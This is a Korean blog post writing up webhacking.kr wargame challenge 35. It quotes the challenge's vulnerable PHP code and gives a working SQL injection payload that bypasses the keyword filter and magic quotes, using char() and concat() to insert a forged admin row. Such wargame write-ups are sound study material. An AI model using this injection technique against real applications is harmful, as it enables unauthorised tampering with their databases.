---
layout: post
title: "Webhacking.kr 35번 문제"
description: ""
categories : development
sub_categories : ""
date: 2017-06-02
tags: []
comments: true
share: true
---

35번 문제는 350 스코어의 문제입니다.

  

문제의 힌트 코드는 아래와 같습니다.

코드를 읽어보면 첫번째로 get 메소드의 phone 파라미터가 참일 경우 `challenge35_list` 테이블에 레코드를 생성한다.

이후 `admin_ck` 라는 변수에 challenge35_list 테이블에 조건에 따른 레코드를 대입한다.

조건은 id는 admin 이어야하고, ip는 본인의 아이피여야합니다.

  

대입된 변수의 `ip` 가 본인의 아이피와 동일하다면 문제를 해결 할 수 있습니다.

  

몇번의 요청 중, webhacking.kr 이 php magic quotes 옵션이 켜져있어 quote 를 사용할 수 없음을 알 았습니다.

만약 옵션이 꺼져있었다면 핵스값으로 문자열을 표현하거나 MySQL의 char함수를 통하여 문자를 만들고, concat 함수를 통해 해당
문자를 연결해야합니다.

  

아래는 "php magic quotes" 에 대한 설명입니다.

  

> Magic Quotes is a process that automagically escapes incoming data to the
PHP script. It's preferred to code with magic quotes off and to instead escape
the data at runtime, as needed.

  

phone:3063),('admin','1.1.1.1', 3072

  

하지만 코드를 보면 알 듯이 전자는 이미 필터링이 되어있으니 후자로 진행을해야합니다.

  

phone 파라미터의 입력된 값은 아래와 같다. (아스키 코드로 치환된 admin,아이피)

e.g. "1),(concat(char(97,100,109,105,110)),concat(char(49,46,50,53,53,46,50,52
,46,52,57)),1"

  

    if($_GET[phone]){if(eregi("%|\*|/|=|from|select|x|-|#|\(\(",$_GET[phone])) exit("no hack");@mysql_query("insert into challenge35_list(id,ip,phone) values('$_SESSION[id]','$_SERVER[REMOTE_ADDR]',$_GET[phone])") or die("query error");echo("Done");}$admin_ck=mysql_fetch_array(mysql_query("select ip from challenge35_list where id='admin' and ip='$_SERVER[REMOTE_ADDR]'"));if($admin_ck[ip]==$_SERVER[REMOTE_ADDR]){@solve();@mysql_query("delete from challenge35_list");}$phone_list=@mysql_query("select * from challenge35_list where ip='$_SERVER[REMOTE_ADDR]'");echo("");

  

클리어.

  

![](/assets/images/posts/759/2713533A59311AFC3859B3.JPEG)

  

  

